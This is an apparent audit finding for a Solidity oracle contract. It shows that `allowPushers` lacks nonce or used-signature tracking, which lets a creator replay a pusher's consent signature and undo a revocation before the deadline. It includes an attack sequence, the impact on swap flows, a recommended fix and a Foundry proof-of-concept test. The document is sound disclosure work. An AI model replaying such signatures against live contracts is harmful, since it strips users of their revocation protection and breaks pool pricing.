### Title
Pusher Revocation Bypassed by Signature Replay Within Deadline Window — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` contains no nonce or used-signature tracking. A creator can replay the pusher's original EIP-191 consent signature at any time before the deadline to silently re-establish a delegation that the pusher already revoked via `revokePusher()`. This is the direct analog of the "approvals not cleared on transfer" bug class: a revocation that the protocol exposes as a self-protection mechanism is rendered ineffective within the deadline window.

### Finding Description

`allowPushers` validates the pusher's consent by recovering the signer from:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The only freshness gate is `_ensureDeadline(deadline)`, which checks `block.timestamp <= deadline`. [2](#0-1) 

There is no nonce, no per-signature consumed flag, and no check that `namespaceRemapping[pusher]` is currently `address(0)` before writing. `revokePusher()` sets the mapping to `address(0)`: [3](#0-2) 

But `allowPushers` unconditionally overwrites it: [4](#0-3) 

Attack sequence:

1. Pusher signs consent with `deadline = T + 1 hour`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` with the **identical** signature → `namespaceRemapping[pusher] = creator` again.
5. Steps 3–4 can repeat indefinitely until `block.timestamp > deadline`.

The code comment acknowledges the deadline is required to prevent re-establishment *after* the pusher revokes, but the implementation only prevents replay *after* the deadline, not *before* it: [5](#0-4) 

### Impact Explanation

While the delegation is forcibly re-established, the pusher faces two bad choices:

- **Push anyway** → data lands in the creator's namespace, not the pusher's own feeds.
- **Stop pushing** → the pusher's own feeds (`feedIdOf(pusher, slotIndex, positionIndex)`) receive no updates and go stale.

Any pool whose `AnchoredPriceProvider` is bound to the pusher's feed IDs will receive a stale price. Once the timestamp exceeds `MAX_TIME_DRIFT`, the oracle read fails or returns a zero/rejected price, breaking swap execution for that pool. [6](#0-5) 

This matches the allowed impact gate: **broken core pool functionality causing unusable swap flows** due to a stale oracle that the pusher cannot remedy until the deadline expires.

### Likelihood Explanation

The trigger requires only that the creator retain the original signed bytes (trivially true — they submitted the transaction and can read it from calldata history) and call `allowPushers` again before the deadline. No privileged role, no special token, no external dependency. The pusher's deadline choice is the only bound, and typical off-chain tooling signs with multi-hour or multi-day deadlines.

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegationHashes` and mark each hash as used on first acceptance. Alternatively, include a per-pusher nonce in the signed payload and increment it on every `revokePusher` / `removePushers` call so that any previously issued signature becomes invalid immediately upon revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;
    uint256 pusherKey = 0xBEEF;
    address pusher;
    address creator;

    function setUp() public {
        pusher  = vm.addr(pusherKey);
        creator = makeAddr("creator");
        oracle  = new CompressedOracleV1(address(this), 60_000);
    }

    function test_revokeBypassedByReplay() public {
        uint256 deadline = block.timestamp + 1 hours;

        // 1. Pusher signs consent
        bytes32 hash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pusherKey, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature — revocation undone
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator); // revocation bypassed
    }
}
```
